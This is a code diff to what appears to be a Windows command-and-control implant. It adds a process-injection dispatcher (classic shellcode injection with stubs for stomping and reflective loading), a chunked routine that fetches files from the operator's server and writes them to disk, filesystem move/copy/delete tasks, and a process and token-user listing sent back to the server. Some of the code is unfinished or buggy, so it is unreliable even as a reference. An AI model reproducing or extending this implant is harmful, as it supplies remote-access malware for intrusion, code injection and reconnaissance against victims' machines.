@@ -55,7 +55,7 @@ auto DECLFN Task::Dispatcher(
                     TaskCode = ( this->*Mgmt[i].Run )( Parser );
                     KhDbg( "task code: %d", TaskCode );
 
-                    if ( TaskCode != ERROR_SUCCESS ) {
+                    if ( TaskCode == ERROR_SUCCESS ) {
                         KhDbg( "task succefully executed" );
                     } else {
                         Kh->Pkg->Error( TaskCode );
@@ -77,10 +77,136 @@ auto DECLFN Task::Dispatcher(
 auto DECLFN Task::Injection(
     _In_ PPARSER Parser
 ) -> ERROR_CODE {
-    PPACKAGE Package = Kh->Pkg->Create( TkInjection, Parser );
-    UINT8    TypeInj = Kh->Psr->GetByte( Parser );
+    PPACKAGE Package  = Kh->Pkg->Create( TkInjection, Parser );
+    ULONG    TypeInj  = Kh->Psr->GetInt32( Parser );
+    ULONG    BuffLen  = 0;
+    ULONG    ArgLen   = 0;
+    PBYTE    Buffer   = Kh->Psr->GetBytes( Parser, &BuffLen );
+    PBYTE    Argument = Kh->Psr->GetBytes( Parser, &ArgLen );
+    PVOID    Base     = NULL;
+    HANDLE   TdHandle = INVALID_HANDLE_VALUE;
+    BOOL     Success  = FALSE;
+
+    if ( TypeInj == KH_INJECTION_SC ) {
+        switch ( Kh->InjCtx.Sc.TechniqueID ) {
+            case KhClassic: {
+                Success = Kh->Inj->Classic( Buffer, BuffLen, 0, 0, &Base, &TdHandle ); break;
+            }
+            case KhStomp: {
+                break;
+            }
+        }
+    } else if ( TypeInj == KH_INJECTION_PE ) {
+        switch ( Kh->InjCtx.PE.TechniqueID ) {
+            case KhReflection: {
+                // Success = Kh->Inj->Reflection(  )
+            }
+        }
+    }
 
     return KhRetError( KH_ERROR_INVALID_INJECTION_ID );
+}
+
+auto DECLFN Task::Download(
+    _In_ PPARSER Parser
+) -> ERROR_CODE {
+    PPACKAGE Package = Kh->Pkg->Create( TkDownload, Parser );
+
+}
+
+auto DECLFN Task::Upload(
+    _In_ PPARSER Parser
+) -> ERROR_CODE {
+    PPACKAGE Package  = NULL;
+    PPARSER  UpParser = (PPARSER)Kh->Hp->Alloc( sizeof( PARSER ) );
+    BOOL     Success  = FALSE;
+
+    ULONG  UUIDLen = 0;
+    PVOID  Data    = { 0 };
+    SIZE_T Length  = 0;
+
+    HANDLE FileHandle = INVALID_HANDLE_VALUE;
+
+    PBYTE FileBuffer = B_PTR( Kh->Hp->Alloc( KH_CHUNK_SIZE ) );
+    ULONG FileLength = 0;
+    PBYTE TmpBuffer  = { 0 };
+    ULONG TmpLength  = 0;
+    ULONG AvalBytes  = 0;
+
+    Kh->Transport.Tf.Up.FileID = Kh->Psr->GetStr( Parser, 0 );
+    Kh->Transport.Tf.Up.Path   = Kh->Psr->GetStr( Parser, 0 );
+
+    if ( !Kh->Transport.Tf.Up.Path ) {
+        Kh->Transport.Tf.Up.Path = ".";
+    }
+
+    KhDbg( "upload file at path %s with id: %s", Kh->Transport.Tf.Up.Path, Kh->Transport.Tf.Up.FileID );
+
+    Kh->Transport.Tf.Up.CurrentChunk = 1;
+
+    do {
+        Package = Kh->Pkg->Create( TkUpload, Parser );
+
+        Kh->Pkg->AddInt32( Package, Kh->Transport.Tf.Up.CurrentChunk );
+        Kh->Pkg->AddString( Package, Kh->Transport.Tf.Up.FileID );
+        Kh->Pkg->AddString( Package, Kh->Transport.Tf.Up.Path );
+        Kh->Pkg->AddInt32( Package, Kh->Transport.Tf.Up.ChunkSize );
+    
+        Kh->Pkg->Transmit( Package, &Data, &Length );
+        Kh->Psr->New( UpParser, Data, Length );
+    
+        Success = Kh->Psr->GetByte( UpParser );
+        if ( !Success ) {
+            KhDbg( "received fail in the chunk: %d", Kh->Transport.Tf.Up.CurrentChunk );
+        }
+    
+        Kh->Transport.Tf.Up.FileID       = Kh->Psr->GetStr( UpParser, &UUIDLen );
+        Kh->Transport.Tf.Up.TotalChunks  = Kh->Psr->GetInt32( UpParser );
+        Kh->Transport.Tf.Up.CurrentChunk = Kh->Psr->GetInt32( UpParser );
+    
+        TmpBuffer = Kh->Psr->GetBytes( UpParser, &TmpLength );
+        if ( !FileBuffer ) {
+            KhDbg( "fail to get chunk file data" );
+        }
+
+        if ( !TmpLength ) break;
+
+        if ( FileLength + TmpLength > AvalBytes ) {
+            AvalBytes = FileLength + TmpLength;
+
+            FileBuffer = B_PTR( Kh->Hp->ReAlloc( FileBuffer, AvalBytes ) );
+        }
+
+        Mem::Copy( C_PTR( U_PTR( FileBuffer ) + AvalBytes ), TmpBuffer, TmpLength );
+
+        FileLength += TmpLength;
+        Kh->Transport.Tf.Up.CurrentChunk++;
+
+        Kh->Psr->Destroy( UpParser );
+
+    } while ( Kh->Transport.Tf.Up.CurrentChunk <= Kh->Transport.Tf.Up.TotalChunks );
+
+    FileHandle = Kh->Krnl32.CreateFileA(
+        Kh->Transport.Tf.Up.Path, GENERIC_ALL, FILE_SHARE_READ, 
+        0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0 
+    );
+    if ( !FileHandle || FileHandle == INVALID_HANDLE_VALUE ) goto _KH_END;
+
+    if ( !( Kh->Krnl32.WriteFile( FileHandle, FileBuffer, FileLength, &TmpLength, 0 ) ) ) {
+        KhDbg( "fail in write file operation" );
+    }
+
+    KhDbg( 
+        "full uploaded with success. file at %p [%d bytes] with chunks: %d", 
+        FileBuffer, FileLength, Kh->Transport.Tf.Up.CurrentChunk -1 
+    );
+
+_KH_END:
+    if ( FileBuffer ) Kh->Hp->Free( FileBuffer, FileLength );
+    if ( Package    ) Kh->Pkg->Destroy( Package  );
+    if ( UpParser   ) Kh->Psr->Destroy( UpParser );
+
+    return KhGetError();
 }
 
 auto DECLFN Task::FileSystem(
@@ -165,37 +291,43 @@ auto DECLFN Task::FileSystem(
             break;
         }
         case SbFsMove: {
-            PCHAR SrcFile = Kh->Psr->GetStr( Parser, 0 );
-            PCHAR DstFile = Kh->Psr->GetStr( Parser, 0 );
+            PCHAR SrcFile = Kh->Psr->GetStr( Parser, &TmpVal );
+            PCHAR DstFile = Kh->Psr->GetStr( Parser, &TmpVal );
+
+            KhDbg( "src %s dst %s", SrcFile, DstFile );
 
             Success = Kh->Krnl32.MoveFileA( SrcFile, DstFile ); 
 
             break;
         }
         case SbFsCopy: {
-            PCHAR SrcFile = Kh->Psr->GetStr( Parser, 0 );
-            PCHAR DstFile = Kh->Psr->GetStr( Parser, 0 );
+            PCHAR SrcFile = Kh->Psr->GetStr( Parser, &TmpVal );
+            PCHAR DstFile = Kh->Psr->GetStr( Parser, &TmpVal );
+
+            KhDbg( "src %s dst %s", SrcFile, DstFile );
 
             Success = Kh->Krnl32.CopyFileA( SrcFile, DstFile, TRUE );
 
             break;
         }
         case SbFsMakeDir: {
-            PCHAR PathName = Kh->Psr->GetStr( Parser, 0 );
+            PCHAR PathName = Kh->Psr->GetStr( Parser, &TmpVal );
 
-            Success = Kh->Krnl32.CreateDirectoryA( PathName, 0 );
+            Success = Kh->Krnl32.CreateDirectoryA( PathName, NULL );
             
             break;
         }
         case SbFsDelete: {
-            PCHAR PathName = Kh->Psr->GetStr( Parser, 0 );
+            PCHAR PathName = Kh->Psr->GetStr( Parser, &TmpVal );
 
             Success = Kh->Krnl32.DeleteFileA( PathName );
 
             break;
         }
         case SbFsChangeDir: {
-            PCHAR PathName = Kh->Psr->GetStr( Parser, 0 );
+            PCHAR PathName = Kh->Psr->GetStr( Parser, &TmpVal );
+
+            KhDbg( "Path to change directory", PathName );
 
             Success = Kh->Krnl32.SetCurrentDirectoryA( PathName );
 
@@ -395,6 +527,8 @@ auto DECLFN Task::Process(
 
     KhDbg( "sub command id: %d", SbCommandID );
 
+    Kh->Pkg->AddByte( Package, SbCommandID );
+
     switch ( SbCommandID ) {
         case SbPsCreate: {
             PCHAR               CommandLine = Kh->Psr->GetStr( Parser, &TmpVal );
@@ -409,9 +543,98 @@ auto DECLFN Task::Process(
             break;
         }
         case SbPsList: {
+            PVOID ValToFree = NULL;
+            ULONG ReturnLen = 0;
+            ULONG Status    = STATUS_SUCCESS;
+            BOOL  Isx64     = FALSE;
+            PCHAR UserToken = { 0 };
+            ULONG UserLen   = 0;
+
+            HANDLE TokenHandle   = INVALID_HANDLE_VALUE;
+            HANDLE ProcessHandle = INVALID_HANDLE_VALUE;
+
+            FILETIME   FileTime   = { 0 };
+            SYSTEMTIME CreateTime = { 0 };
+
+            PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
+            PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
+
+            Kh->Ntdll.NtQuerySystemInformation( SystemProcessInformation, 0, 0, &ReturnLen );
+
+            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Kh->Hp->Alloc( ReturnLen );
+            if ( !SysProcInfo ) {}
+            
+            Status = Kh->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
+            if ( Status != STATUS_SUCCESS ) {}
+
+            ValToFree = SysProcInfo;
+
+            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
+
+            do {
+                if ( !SysProcInfo->ImageName.Buffer ) {
+                    Kh->Pkg->AddWString( Package, L"-" );
+                } else {
+                    Kh->Pkg->AddWString( Package, SysProcInfo->ImageName.Buffer );
+                }
+                
+                Kh->Pkg->AddInt32( Package, HandleToUlong( SysProcInfo->UniqueProcessId ) );
+                Kh->Pkg->AddInt32( Package, HandleToUlong( SysProcInfo->InheritedFromUniqueProcessId ) );
+                Kh->Pkg->AddInt32( Package, SysProcInfo->HandleCount );
+                Kh->Pkg->AddInt32( Package, SysProcInfo->SessionId );
+                
+                Kh->Pkg->AddInt32( Package, SysProcInfo->NumberOfThreads );
+            
+                ProcessHandle = Kh->Ps->Open( PROCESS_QUERY_INFORMATION, FALSE, HandleToUlong( SysProcInfo->UniqueProcessId ) );
+                
+                Kh->Tkn->ProcOpen( ProcessHandle, TOKEN_QUERY, &TokenHandle );
+
+                Kh->Tkn->GetUser( &UserToken, &UserLen, TokenHandle );            
+
+                if ( !UserToken ) {
+                    Kh->Pkg->AddString( Package, "-" );
+                } else {
+                    Kh->Pkg->AddString( Package, UserToken );
+                }
+
+                // NtQueryInformationProcess( ProcessHandle, )
+            
+                Kh->Krnl32.IsWow64Process( ProcessHandle, &Isx64 );
+                
+                Kh->Pkg->AddInt32( Package, Isx64 );
+
+                // FileTime.dwHighDateTime = SysProcInfo->CreateTime.HighPart;
+                // FileTime.dwLowDateTime  = SysProcInfo->CreateTime.LowPart;
+            
+                // Kh->Krnl32.FileTimeToSystemTime( &FileTime, &CreateTime );
+            
+                // Kh->Pkg->AddInt16( Package, CreateTime.wDay );
+                // Kh->Pkg->AddInt16( Package, CreateTime.wMonth );
+                // Kh->Pkg->AddInt16( Package, CreateTime.wYear );
+                // Kh->Pkg->AddInt16( Package, CreateTime.wHour );
+                // Kh->Pkg->AddInt16( Package, CreateTime.wMinute );
+                // Kh->Pkg->AddInt16( Package, CreateTime.wSecond );
+                
+                SysThreadInfo = SysProcInfo->Threads;
+            
+                // for (INT i = 0; i < SysProcInfo->NumberOfThreads; i++) {
+                    // Kh->Pkg->AddInt32( Package, HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) );
+                    // Kh->Pkg->AddInt64( Package, U_PTR( SysThreadInfo[i].StartAddress ) );
+                    // Kh->Pkg->AddInt32( Package, SysThreadInfo[i].Priority );
+                    // Kh->Pkg->AddInt32( Package, SysThreadInfo[i].ThreadState );
+                // }
+            
+                if ( ProcessHandle ) Kh->Ntdll.NtClose( ProcessHandle );
+            
+                SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
+
+            } while ( SysProcInfo->NextEntryOffset );
+
             break;
         }
     } 
+
+    Kh->Pkg->Transmit( Package, 0, 0 );
 
     KhRetSuccess;
 }
